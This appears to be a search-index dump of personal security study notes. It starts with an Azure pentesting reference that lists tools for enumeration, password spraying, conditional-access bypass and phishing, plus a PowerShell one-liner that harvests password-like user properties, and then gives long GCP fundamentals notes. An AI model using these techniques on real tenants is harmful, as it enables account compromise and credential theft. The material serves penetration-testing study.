</ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#public-repositories-and-leaked-credentials","title":"Public repositories and leaked credentials","text":"<ul> <li>gitleaks (https://github.com/zricethezav/gitleaks)</li> <li>trufflehog (https://github.com/trufflesecurity/truffleHog)</li> <li>git-secrets (https://github.com/awslabs/git-secrets)</li> <li>shhgit (https://github.com/eth0izzle/shhgit)</li> <li>gitrob (https://github.com/michenriksen/gitrob)</li> <li>dumpsterdiver\u00a0GitHub - securing/DumpsterDiver: Tool to search secrets in various filetypes.</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#enumeration","title":"Enumeration","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#public-storage-accounts-enumeration","title":"Public Storage Accounts Enumeration","text":"<ul> <li>Public Buckets (osint.sh)</li> <li>Public Buckets by GrayhatWarfare </li> <li>GitHub - initstring/cloud_enum: Multi-cloud OSINT tool. Enumerate public resources in AWS, Azure, and Google Cloud.</li> <li>Microburst:\u00a0Invoke-EnumerateAzureBlobs  </li> <li>https://storagename.blob.core.windows.net/CONTAINERNAME?restype=container&amp;comp=list\u00a0(https://docs.microsoft.com/en-us/rest/api/storageservices/list-containers2)  </li> <li>GitHub - cyberark/BlobHunter: Find exposed data in Azure with this public blob scanner</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#onedrive-enumeration","title":"OneDrive Enumeration","text":"<ul> <li>GitHub - nyxgeek/onedrive_user_enum: onedrive user enumeration - pentest tool to enumerate valid o365 users </li> <li>https://www.trustedsec.com/blog/achieving-passive-user-enumeration-with-onedrive/</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#service-enumeration","title":"Service Enumeration","text":"<ul> <li>PS C:\\ &gt; Invoke-EnumerateAzureSubDomains -Base \\ -Verbose   <li>GitHub - 0xsha/CloudBrute: Awesome cloud enumerator</li>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#subdomain-takeover","title":"Subdomain Takeover","text":"<ul> <li>Subdomain Takeover in Azure: making a PoC | GoDiego</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#user-enumeration","title":"User enumeration","text":"<ul> <li>GitHub - LMGsec/o365creeper: Python script that performs email address validation against Office 365 without submitting login attempts. </li> <li>https://login.microsoftonline.com/getuserrealm.srf?login=\\&amp;xml=1 <li>GitHub - dirkjanm/ROADtools: A collection of Azure AD tools for offensive and defensive security purposes\u00a0(authenticated)  </li> <li>GitHub - nyxgeek/o365recon: retrieve information via O365 and AzureAD with a valid cred </li> <li>GitHub - DanielChronlund/DCToolbox: Tools for Microsoft cloud fans</li>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#shadow-admin-privileged-users-enumeration","title":"Shadow Admin / Privileged Users Enumeration","text":"<ul> <li>GitHub - cyberark/SkyArk: SkyArk helps to discover, assess and secure the most privileged entities in Azure and AWS</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#secrets-in-azure","title":"Secrets in Azure","text":"<p>Not sure if this still works:\u00a0GitHub - FSecureLABS/Azurite: Enumeration and reconnaissance activities in the Microsoft Azure Cloud. </p> <p>Find credentials in</p> <ul> <li>Environment variables or source code (Azure Function)</li> <li>.publishsettings</li> <li>Web &amp; app config</li> </ul> <pre><code> $users = Get-MsolUser -All; foreach($user in $users){$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like \"*password*\"){Write-Output (\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop)}}}\n</code></pre>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#initial-access-attack","title":"Initial Access Attack","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#password-spraying","title":"Password spraying","text":"<ul> <li>GitHub - SecurityRiskAdvisors/msspray: Password attacks and MFA validation against various endpoints in Azure and Office 365</li> <li>GitHub - dafthack/MSOLSpray: A password spraying tool for Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled. </li> <li>GitHub - MarkoH17/Spray365: Spray365 makes spraying Microsoft accounts (Office 365 / Azure AD) easy through its customizable two-step password spraying approach. The built-in execution plan features options that attempt to bypass Azure Smart Lockout and insecure conditional access policies.</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#bypass-conditional-access","title":"Bypass conditional access","text":"<ul> <li>The Attackers Guide to Azure AD Conditional Access \u2013 Daniel Chronlund Cloud Security Blog </li> <li>How to Find MFA Bypasses in Conditional Access Policies - YouTube </li> <li>Getting started with ROADrecon \u00b7 dirkjanm/ROADtools Wiki \u00b7 GitHub</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#instance-metadata-service","title":"Instance Metadata Service","text":"<ul> <li>Steal Secrets with Azure Instance Metadata Service? Don\u2019t Oversight Role-based Access Control | by Marcus Tee | Marcus Tee Anytime | Medium</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#phishing","title":"Phishing","text":"<ul> <li>Illicit Consent Grant Attack</li> <li>Abusing Device Code Flow: - OAuth\u2019s Device Code Flow Abused in Phishing Attacks | Secureworks</li> <li>Evilginx2:  - GitHub - kgretzky/evilginx2: Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication</li> </ul>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#lateral-movement","title":"Lateral movement","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#privilege-escalation","title":"Privilege escalation","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/pentesting-azure/#persistence","title":"Persistence","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/containers/pentesting-docker/","title":"Pentesting docker","text":"<p>https://www.panoptica.app/research/7-ways-to-escape-a-container</p>","tags":["cloud","docker","containers"]},{"location":"cloud/gcp/gcp-essentials/","title":"Google Cloud Platform (GCP) Essentials","text":"Sources of this notes <ul> <li>Udemy course: Google Cloud Platform (GCP) Fundamentals for Beginners</li> </ul> <p>Cheatsheets: gcloud CLI </p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#basic-numbers","title":"Basic numbers","text":"<ul> <li>20 regions</li> <li>61 zones</li> <li>134 network edge locations</li> <li>200+ countries and territories.</li> </ul> <p>A Region typically has two Zones. A zone is the equivalent of a data center in Google Cloud.</p> <p>Overview of services:</p> <p></p> <p></p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#signing-up-with-gcp","title":"Signing-up with GCP","text":"<p>$300 in free credits to run more than 25 service for free.  are provided with 90</p> <p>Link: https://cloud.google.com/gcp/</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#gcp-resources","title":"GCP resources","text":"<p>In Google Cloud Platform, everything that you create is a resource. There is a hierarchy:</p> <ul> <li>Everything that you create is a resource.</li> <li>Resources belong to a project. </li> <li>A project directly represents a billable unit. It has a credit card associated. </li> <li>Projects may be organized into folders (like dev or production), which provide logical grouping of projects.</li> <li>Folders belong to one and only one organization.</li> <li>The organization is the top level entity in GCP hierarchy.</li> </ul> <p></p> <p>If you use Google Suite, you will see the organization level and folders. If you don't, you will only have access to projects and resources.</p> <p>To interact with GCP there are these tools: web console, cloud shell cloud SDK, mobile App, Rest API.</p> <p>GCP Cloud Shell is an interactive shell environment for GCP, accessible from any web browser, with a preloaded IDE  named gcloud, which is the command line utility, and based on a GCE Virtual Machine (provisioned with 5GB persistent disk storage and Debian environment). It has a built-in preview functionality withou dealing with tunneling and other issues.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#2-compute-services","title":"2. Compute Services","text":"<p>Code is deployed and executed in one of the compute services:</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#21-app-engine","title":"2.1. App Engine","text":"<p>It's one of the first compute services from Google (PaaS) in 2008. It's a fully managed platform for deploying web apps at scale. It supports multiple languages. It's available in two environments: </p> <ul> <li>Standard: Applications run in a sandbox.</li> <li>Flexible: You have more control on packages and environments. Applications run on docker containers, which are in use to deploy but also to scale apps.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#22-compute-engine-gce","title":"2.2. Compute Engine (GCE)","text":"<p>Google Compute Engine (GCE) enables Linux and Windows VMs to run on Google's global infraestructure. VMs are based on machine types with varied CPU and RAM configuration.</p> <p>If you need that VMs are persistent, you need to attach additional storage such standards and SSD disks. Otherwise, when closing the VM you will loose all configurations and setups.</p> <p>VMs are charged a minimum of 1 minute and in 1 second increments  after that. Sustained use discounts are offered for running VMs for a significant portion of the billing month. Committed use discounts are offered for purchases based on1 year or 3 year contracts.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#23-kubernetes-engine","title":"2.3. Kubernetes Engine","text":"<ul> <li>GKE is a managed environment for deploying containerized applications managed by Kubernetes. Kubernetes was originated on Google but now is open source project part of Cloud-Native Computing Foundation. </li> <li>Kubernetes has a control plane and worker node (or multiple).</li> <li>GKE provisions worker nodes as GCE VMs. Google manages the control plane (and the master nodes) and that is why is called a managed environment.</li> <li>Node pools enable mixing and matching different VM configurations.</li> <li>The service is tightly integrated with GCP resources such as networking, storage, and monitoring. </li> <li>GKE infrastructure is monitored by Stack Driver, which is the built-in monitoring and tracing platform.</li> <li>Auto scaling, automatic upgrades, and node auto-repair are some of the unique features of GKE.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#24-cloud-functions","title":"2.4. Cloud Functions","text":"<ul> <li>Cloud Functions is a serverless execution environment connecting cloud services for building and connecting cloud services. </li> <li>Serverless compute environments execute code in response to an event.</li> <li>Cloud Functions supports JavaScript, Python, and Go.</li> <li>GCP events fire a Cloud Function through a trigger. </li> <li>An example event includes adding an object to a storage bucket.</li> <li>Trigger connects the event to the function.</li> <li>This is FaaS, Function as a Service.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#3-storage-services","title":"3. Storage Services","text":"<ul> <li>Storage services add persistence and durability to applications</li> <li> <p>Storage services are classified into three types:</p> <ul> <li>Object storage</li> <li>Block storage</li> <li>File system</li> </ul> </li> <li> <p>GCP storage services can be used to store:</p> </li> <li>Unstructured data</li> <li>Folders and Files</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#31-google-cloud-storage","title":"3.1. Google Cloud Storage","text":"<ul> <li>Unified object storage for a variety of applications. </li> <li>Applications can store and retrieve objects (typically through single API).</li> <li>GCS can scale to exabytes of data.</li> <li>GCS is designed for 99.999999999% durability.</li> <li>GCS can be used to store high-frequency and low-frequency access of data.</li> <li>Data can be stored within a single region, dual-region, or multi-region.</li> <li>There are three default storage class for the data: Standard, Nearline, and Coldline.</li> </ul> <ul> <li>Launching GCS. When creating a Storage entity in GCP, we will create buckets, which are containers for folders and storage objects. Folders may contain Files. Therefore, Buckets are the highest level container in the GCS hierarchy. As for encryption, you can decided if it is Google-managed key or Customer-managed key. Additionally, retention policy can be added when creating a storage entity. You also have labels. After that you can create folders and allocate files in them.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#32-persistent-disks","title":"3.2. Persistent Disks","text":"<ul> <li>PD provides reliable block storage for GCE VMs. </li> <li>Disks are independent of Compute Engine VMs, which means they can have a different lifecycle.</li> <li>Each disk can be up to 64TB in size. </li> <li>PDs can have one writer and multiple readers. This is quite unique in GCP. Basically, if you have a scenario where you need to attach the disk to one VM for read-write access but read that data from multiple VMs in a read-only mode, you can do that with persistent disks. So one VM will act as the writer and all other VMs will act as readers. So this gives you the ability to designate one VM for read-write, while adding multiple VMs that are quickly reading from the same disk with a read-only access. This opens up lot of opportunities where you need to create distributed applications with centralized data access.</li> <li>Supports both SSD and HDD storage options. </li> <li>SSD offers best throughput for I/O intensive applications. </li> <li>PD is available in three storage types:<ul> <li>Zonal.</li> <li>Regional.</li> <li>Local.</li> </ul> </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#33-google-cloud-filestore","title":"3.3. Google Cloud Filestore","text":"<ul> <li>Managed file storage service traditionally for legacy applications. </li> <li>Delivers NAS-like filesystem interface and a shared filesystem. </li> <li>Centralized, highly-available filesystem for GCE and GKE. </li> <li>Exposed as a NFS fileshare with fixed export settings and default Unix permissions. </li> <li>Filestore file shares are available as mount points in GCE VMs. </li> <li>On-prem applications using NAS take advantage of Filestore. </li> <li>Filestore has built-in zonal storage redundancy for data availability. </li> <li>Data is always encrypted while in transit. </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#4-network-services","title":"4. Network Services","text":"<ul> <li>Network services are one of the key building blocks of cloud. </li> <li>GCP leverages Google\u2019s global network for connectivity. </li> <li>Customers can choose between standard and premium tiers. Standard allows you to use the normal backbone of GCP network and Premium gives you access to the premium backbone. Therefore, Standard tier leverages selection of ISP-based internet backbone for connectivity (which is cheaper). GCP uses premium tier as the default option.</li> <li>Load balancers route the traffic evenly to multiple endpoints. </li> <li>Virtual Private Cloud (VPC) offers private and hybrid networking. </li> <li>Customers can extend their data center to GCP through hybrid connectivity.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#41-load-balancers","title":"4.1. Load Balancers","text":"<ul> <li>Load balancer distributes traffic across multiple GCE VMs in a single or multiple regions. </li> <li>There are two types of GCP load balancers:<ul> <li>HTTP(S) load balancer, which  provides global load balancing.</li> <li>Network load balancer, which balances regional TCP and UDP traffic within the same region. \u2022 Both types can be configured as internal or external load balancers</li> </ul> </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#configure-is-a-couple-of-vms-deployed-in-a-region-connected-to-a-load-balancer","title":"Configure is a couple of VMs deployed in a region connected to a load balancer","text":"<ul> <li>From GCP web dashboard, go to Compute Engine, then Instance Templates. </li> <li>Select machine type, disk image, and allow  HTTP and HTTPs in firewall configuration since we are launching a web server. Configure automation to get the server running from booting. Add the following script:</li> </ul> <pre><code># Add the below script while creating the instance template \n\n#! /bin/bash \napt-get update \napt-get install -y apache2 \ncat &lt;&lt;EOF &gt; /var/www/html/index.html \n&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello from $(hostname)&lt;/h1&gt; \n&lt;/body&gt;&lt;/html&gt; \nEOF \n</code></pre> <ul> <li>Create the template.</li> <li>Now go to Instance group for setting up the deployment. Configure multiple zones, select the instance template (the one you created before) and the number of instances to deploy. Create a Health Check. Launch the instance group and in a few minutes you will have the 2 web servers (Go to VM instances to see them).</li> <li>Go to Network section, then Load balancing and click on create load balancer, and follow the creation tunnel.</li> <li> <p>The first step is creating a backend configuration. So the backend configuration will ensure that we have a set of resources responsible for serving the traffic. Options to configure there:</p> <ul> <li>Network endpoint groups // Or // Instance groups : choose the backend type as the instance group and choose the web server instance group we have launched in the previous step. Port is 80. That is the default port on which Apache is listening.</li> <li>Balancing mode: traffic can be routed based on CP utilization or the request per second. If you are not  going to send a lot of traffic, choose rate. </li> <li>The maximum RPS,  100.</li> <li>Associate this backend with the health check created earlier. This health check will be a checkpoint for the load balancer to decide whether to route the traffic to the instance or not. If the health check fails for one of the instances load balancer will gracefully send a request to the other instance and this will enhance the user experience where they only see only see the output coming from healthy instances.</li> </ul> </li> <li> <p>The second step is setting up host and path rules, there are not multiple endpoints, leave that as the default.</p> </li> <li>Third step, Front end configuration. The front end is basically how the consumer or the client of your application sees the endpoint. Configure it:<ul> <li>Provide a name.</li> <li>Protocol is HTTP.</li> <li>Premium, this is the network service there.</li> <li>IPv4, it's an ephemeral IP address.</li> </ul> </li> <li>Fourth step, review settings.</li> </ul> <p>In about five minutes, the load balancer will be completely functioning, which means it will be able to route the traffic to one of the instances in the backend group, which is based on the instance template that we created. By accessing to the load balancer IP:80 you will be redirected each time to a different machine.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#42-virtual-private-cloud-vpc","title":"4.2. Virtual Private Cloud (VPC)","text":"<ul> <li>VPC is a software defined network providing private networking for VMs. </li> <li>VPC network is a global resource with regional subnets. </li> <li>Each VPC is logically isolated from each other. </li> <li>Firewall rules allow or restrict traffic within subnets. Default option is deny.</li> <li>Resources within a VPC communicate via IPV4 addresses and there is a DNS service within VPC that provides name resolution.</li> <li>VPC networks can be connected to other VPC networks through VPC peering. </li> <li>VPC networks are securely connected in hybrid environments using Cloud VPN or Cloud Interconnect.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#43-hybrid-connectivity","title":"4.3. Hybrid Connectivity","text":"<ul> <li>Hybrid connectivity extends local data center to GCP.</li> <li>Three GCP services enable hybrid connectivity:<ul> <li>Cloud Interconnect: Cloud Interconnect extends on-premises network to GCP via Dedicated or Partner Interconnect. </li> <li>Cloud VPN: Cloud VPN connects on-premises environment to GCP securely over the internet through IPSec VPN.</li> <li>Peering: Peering enables direct access to Google Cloud resources with reduced Internet egress fee</li> </ul> </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#5-identity-access-management","title":"5. Identity &amp; Access Management","text":"<ul> <li>IAM controls access by defining who (identity) has what access (role) for which resource.  Members (who), roles (what) , and permissions (which).</li> <li>Cloud IAM is based on the principle of least privilege. </li> <li>An IAM policy binds identity to roles which contains permissions.</li> </ul> <p>Where do you use IAM?</p> <p>\u2022 To share GCP resources with fine-grained control. \u2022 Selectively allow/deny permissions to individual resources. \u2022 Define custom roles that are specific to a team/organization. \u2022 Enable authentication of applications through service accounts.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#51-cloud-iam-identity","title":"5.1. Cloud IAM Identity","text":"<p>A Google account is a Cloud IAM user so anyone with a gmail account or a google account will become visible as a cloud IAM user.</p> <p>A Service account is a special type of user. It's meant for applications to talk to GCP resources.</p> <p>A Google group is also a valid user or a member in Cloud IAM because it represents a logical entity that is a collection of users.</p> <p>A G Suite domain like yourorganization.com is also a valid user or a member. You can assign permissions to an entire G Suite domain.</p> <p>If you are not part of google, you can use Cloud Identity Service to create a Cloud identity domain, that is also a valid Cloud IAM user. </p> <p>And \"allAuthenticatedUsers\" is also an entity that allows you to assign permissions to all users authenticated through Google's authentication system.</p> <p>Last,  \"allUsers\" assigns permissions even to anonymous users.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#52-cloud-iam-permissions","title":"5.2. Cloud IAM Permissions","text":"<ul> <li>Permissions determine the operations performed on a resource (launch an instance, deploy an object into a store bucket.)</li> <li>Correspond 1:1 with REST methods of GCP resources. GCP is based on a collection of APIs.</li> <li>Each GCP resource exposes REST APIs to perform operations.</li> <li>Permissions are directly mapped to each REST API.<ul> <li>Publisher.Publish() -&gt; pubsub.topics.publish.</li> </ul> </li> <li>Permissions cannot be assigned directly to members/users, but to a role. You group multiple permissions into a role and to assign that role to a member.</li> <li>One or more permissions are assigned to an IAM Role</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#53-cloud-iam-roles","title":"5.3. Cloud IAM Roles","text":"<p>Roles are a logical grouping of permissions.</p> <ul> <li>Primitive roles:<ul> <li>Owner: unlimited access to a resource.</li> <li>Editor.</li> <li>Viewer.</li> </ul> </li> <li>Predefined roles that associate a set of operations typically associated to objects. Every object in GCP has a set of predefined roles: <ul> <li>roles/pubsub.publisher</li> <li>roles/compute.admin</li> <li>roles/storage.objectAdmin</li> </ul> </li> <li>Custom roles:<ul> <li>Collection of assorted set of permissions.</li> <li>Fine-grained access to resources.</li> </ul> </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#54-key-elements-of-cloud-iam","title":"5.4. Key Elements of Cloud IAM","text":"<ul> <li>Resource \u2013 Any GCP resource<ul> <li>Projects</li> <li>Cloud Storage Buckets</li> <li>Compute Engine Instances</li> <li>...</li> </ul> </li> <li>Permissions - Determines operations allowed on a resource<ul> <li>Syntax for calling permissions:</li> </ul> </li> </ul> <pre><code>    &lt;service&gt;.&lt;resource&gt;.&lt;verb&gt;\n    - pubsub.subscriptions.consume\n    - compute.instances.insert\n</code></pre> <ul> <li> <p>Roles \u2013 A collection of permissions</p> <ul> <li>Compute.instanceAdmin<ul> <li>compute.instances.start</li> <li>compute.instances.stop</li> <li>compute.instances.delete</li> <li>\u2026.</li> </ul> </li> </ul> </li> <li> <p>Users \u2013 Represents an identity</p> <ul> <li>Google Account</li> <li>Google Group</li> <li>G Suite Domain</li> <li>\u2026</li> </ul> </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#55-service-accounts","title":"5.5. Service Accounts","text":"<ul> <li>A special Google account that belongs to an application or VM. It doesn't represent an user or identities.</li> <li>Service account is identified by its unique email address assigned by GCP, you don't have control on it, it's automatically created by GCP.</li> <li>Service accounts are associated with key-pairs used for authentication . This key is the token that identified the application.</li> <li>Two types of service accounts: <ul> <li>User managed, which can be associated with a role. </li> <li>Google managed.</li> </ul> </li> <li>Each service account is associated with one or more roles. </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#6-database-services","title":"6. Database Services","text":"<ul> <li>GCP has managed relational and NoSQL database  services. </li> <li>Traditional web and line-of-business apps may use  RDBMS.</li> <li>Modern applications rely on NoSQL databases.</li> <li>Google has Web-scale, distributed applications need multi-region databases.</li> <li>In-memory database is used for accelerating the performance of apps</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#61-google-cloud-sql","title":"6.1. Google Cloud SQL","text":"<ul> <li>One of the most common services in GCP.</li> <li>Fully managed RDBMS service that simplifies set up, maintain, manage, and administer database instances.</li> <li>Cloud SQL supports three types of RDBMS (Relational DataBase Management  Servers):<ul> <li>MySQL</li> <li>PostgreSQL</li> <li>Microsoft SQL Server (Preview)</li> </ul> </li> <li>A managed alternative to running RDBMS in VMs.</li> <li>Cloud SQL delivers scalability, availability, security, and reliability of  database instances.</li> <li>Cloud SQL instances may be launched within VPC for additional security.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#62-google-clod-bigtable","title":"6.2. Google Clod Bigtable","text":"<ul> <li>Petabyte-scale, managed NoSQL database service. </li> <li>Sparsely populated table that can scale to billions of rows and thousands of columns. </li> <li>Storage engine for large-scale, low-latency applications. </li> <li>Ideal for throughput-intensive data processing and analytics.</li> <li>An alternative to running Apache HBase column-oriented database in VMs.</li> <li>Acts as a storage engine for MapReduce operations, stream processing, and machine-learning applications</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#63-google-cloud-spanner","title":"6.3. Google Cloud Spanner","text":"<ul> <li>Managed, scalable, relational database service for regional and global application data.</li> <li>Scales horizontally across rows, regions, and continents.</li> <li>Brings best of relational and NoSQL databases.</li> <li>Supports ACID transactions and ANSI SQL queries.</li> <li>Data is replicated synchronously with globally strong consistency.</li> <li>Cloud Spanner instances run in one of the three region types:<ul> <li>Read-write</li> <li>Read-only</li> <li>Witness</li> </ul> </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#64-google-cloud-memorystore","title":"6.4. Google Cloud Memorystore","text":"<ul> <li>A fully-managed in-memory data store service for Redis.</li> <li>Ideal for application caches that provides sub-millisecond data access.</li> <li>Cloud Memorystore can support instances up to 300 GB and network throughput of 12 Gbps.</li> <li>Fully compatible with Redis protocol.</li> <li>Promises 99.9% availability with automatic failover.</li> <li>Integrated with Stackdriver for monitoring.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#7-data-and-analytics-services","title":"7. Data and Analytics Services","text":"<ul> <li>Data analytics include ingestion, collection, processing, analyzing, visualizing data.</li> <li>GCP has a comprehensive set of analytics services.</li> <li>Cloud Pub/Sub is typically used for ingesting data at scale, whether it is telemetry data coming from sensors or logs coming from your applications and infrastructure.</li> <li>Cloud Dataflow can process data in real-time or batch mode.</li> <li>Cloud Dataproc is a Big Data service for running Hadoop and Spark jobs. These are typically used with MapReduce with large data sets that form the big data stores with historical data or data stored in traditional databases.</li> <li>BigQuery is the data warehouse in the cloud. Lot of Google Cloud customers rely on BigQuery for analyzing historical data and deriving insights from that.</li> <li>Cloud Datalab is used for analyzing and visualizing data</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#71-google-cloud-pub-sub","title":"7.1. Google Cloud Pub / Sub","text":"<ul> <li>Managed service to ingest data at scale.</li> <li>Based on the publishing/subscription pattern. It is built using the published subscribe pattern where you have a set of publishers that send messages to a topic, and there are a set of subscribers that subscribe to the topic, and Pub/Sub provides the infrastructure for the publishers and subscribers to reliably exchange messages.</li> <li>Global entry point to GCP-based analytics services.</li> <li>Acts as a simple and reliable staging location for data. Pub/Sub is not meant to be a durable data store. </li> <li>Tightly integrated with services such as Cloud Storage and Cloud Dataflow.</li> <li>Supports at-least-once delivery with synchronous, cross-zone message replication. What this means is you actually get a highly reliable delivery mechanism based on Pub/Sub, and there is redundancy because of cross zone message replication. You don't lose messages when it is sent via Cloud Pub/Sub infrastructure.</li> <li>Comes with end-to-end encryption, IAM, and audit logging.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#72-google-cloud-dataflow","title":"7.2. Google Cloud Dataflow","text":"<ul> <li>Managed service for transforming and enhancing data in stream and batch modes: Cloud Dataflow is meant for transforming and enhancing data, either coming via real-time streams or data stored in Cloud Storage, which is processed in batch mode.</li> <li>Based on Apache Beam open source project: Cloud Dataflow is based on an open source project called Apache Beam. Google is one of the key contributors to Apache Beam open source project. And Cloud Dataflow is a commercial implementation of Apache Beam, and it supports a serverless approach, which automates provisioning and management. </li> <li>Serverless approach automates provisioning and management: With serverless infrastructure and serverless computing, you don't need to provision resources and scale them manually. Instead, you start streaming the data and connecting that to Dataflow, maybe via Pub/Sub. And it can automatically start processing the data and scales the infrastructure based on the inbound data stream.</li> <li>Inbound data can be queried, processed, and extracted for target environment.</li> <li>Tightly integrated with Cloud Pub/Sub, BigQuery, and Cloud Machine Learning.</li> <li>Cloud Dataflow connector for Kafka makes it easy to integrate Apache Kafka. </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#73-google-cloud-dataproc","title":"7.3. Google Cloud Dataproc","text":"<ul> <li>Managed Apache Hadoop and Apache Spark cluster environments.</li> <li>Automated cluster management.</li> <li>Clusters can be quickly created and resized from three to hundreds of node.</li> <li>Move existing Big Data projects to GCP without redevelopment.</li> <li>Frequent updates to Spark, Hadoop, Pig, and Hive and other components of the Apache ecosystem.</li> <li>Integrates with other GCP services like Cloud Dataflow and BigQuery</li> </ul> <p>In the Dataproc sync pipeline, data enters through Pub/Sub, gets transformed through Dataflow, and gets processed with Dataproc. Typically in the form of a map reduce job, retain for Apache Hadoop or Apache Spark. And the output of Dataproc can be stored in Big Query, or it can go to Google cloud storage.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#74-google-cloud-datalab","title":"7.4. Google Cloud DataLab","text":"<ul> <li>Interactive tool for data exploration, analysis, visualization, and machine learning.</li> <li>Runs on Compute Engine and may connect to multiple cloud services.</li> <li>Built on open source Jupyter Notebooks platform.</li> <li>Enables analysis data coming from BigQuery, Cloud ML Engine, and Cloud Storage.</li> <li>Supports Python, SQL, and JavaScript languages.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#75-bigquery","title":"7.5. BigQuery","text":"<ul> <li>Serverless, scalable cloud data warehouse.: \u00a0Google BigQuery is one of the early analytic services that got added to GCP. It's a very powerful, very popular service used by Enterprise customers to analyze data.</li> <li>Has an in-memory BI Engine and machine learning built in, so as you query data from BigQuery you can apply machine learning algorithms that can perform predictive analytics right out of the box.</li> <li>Supports standard ANSI:2011 SQL dialect for querying. You don't need to learn new languages your domain specific languages to deal with BigQuery. You can use familiar SQL queries that support inner joins, outer joins, group by clauses and WHERE clauses to extract data and to analyze from existing data stores. </li> <li>Federated queries can process external data sources. BigQuery can pull the data from all of these sources and can perform one single query that will automatically join and do group by clauses so you get a unified view of the dataset:<ul> <li>Cloud Storage.</li> <li>Cloud Bigtable.</li> <li>Spreadsheets (Google Drive).</li> </ul> </li> <li>Automatically replicates data to keep a seven-day history of changes.</li> <li>Supports data integration tools like Informatica and Talend.</li> 